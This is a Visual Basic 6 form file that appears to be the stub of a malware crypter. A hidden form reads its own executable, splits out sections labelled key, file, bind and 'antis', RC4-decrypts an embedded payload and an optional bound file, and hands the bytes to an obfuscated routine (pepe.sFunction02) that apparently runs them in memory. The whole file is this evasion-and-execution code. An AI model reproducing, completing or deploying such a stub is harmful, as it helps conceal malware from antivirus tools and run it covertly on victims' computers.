VERSION 5.00
Begin VB.Form frmMain 
   Caption         =   "Form1"
   ClientHeight    =   420
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   1740
   LinkTopic       =   "Form1"
   ScaleHeight     =   420
   ScaleWidth      =   1740
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()

Dim Data As String

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
    Data = Space(POF(App.Path & "\" & App.EXEName & ".exe"))
    Get #1, , Data
Close #1

      
'0 = stub
'1 = antis
'2 = key
'3 = file
'4 = bind
        
        
Dim Datas()        As String

Datas() = Split(Data, "\$<\$@\$D")

Dim RC4 As New cyuah


Datas(3) = RC4.DecryptString(Datas(3), Datas(2))
If Datas(4) <> "" Then
Datas(4) = RC4.DecryptString(Datas(4), Datas(2))
End If

Dim TheByte()        As Byte
Dim TheByte2()        As Byte

TheByte() = StrConv(Datas(3), vbFromUnicode)
TheByte2() = StrConv(Datas(4), vbFromUnicode)

    Dim a As New pepe
    
    Call a.sFunction02(TheByte, App.Path & "\" & App.EXEName & ".exe")

If Datas(4) <> "" Then
    Call a.sFunction02(TheByte2, App.Path & "\" & App.EXEName & ".exe")
End If
End
End Sub
Public Function POF(sPath As String) As Double
Dim Fso, F As Object
   
Set Fso = CreateObject("Scripting.FileSystemObject")
Set F = Fso.GetFile(sPath)
   
POF = F.Size
End Function
